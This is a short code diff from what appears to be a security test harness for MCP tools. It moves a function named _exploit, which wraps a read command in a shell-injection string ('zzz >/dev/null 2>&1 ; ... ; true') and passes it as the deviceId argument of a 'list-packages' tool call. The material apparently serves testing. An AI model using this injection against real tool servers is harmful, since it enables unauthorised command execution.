@@ -63,6 +63,14 @@ KEPT_PLACES: tuple[str, ...] = (
 AIM = re.compile(r";\s")
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        device_id = _injection(_read_cmd(places[place_id].coordinates))
+        await client.call_tool("list-packages", {"deviceId": device_id})
+
+    return run
+
+
 def _injection(read_cmd: str) -> str:
     return f"zzz >/dev/null 2>&1 ; {read_cmd} ; true"
 
@@ -83,14 +91,6 @@ def _read_cmd(coord: Coordinates) -> str:
     if coord.kind is PlaceKind.HTTP_ENDPOINT:
         return f"curl -s http://{coord.host}{coord.path}"
     raise ValueError(f"no command-execution read for kind {coord.kind}")
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        device_id = _injection(_read_cmd(places[place_id].coordinates))
-        await client.call_tool("list-packages", {"deviceId": device_id})
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
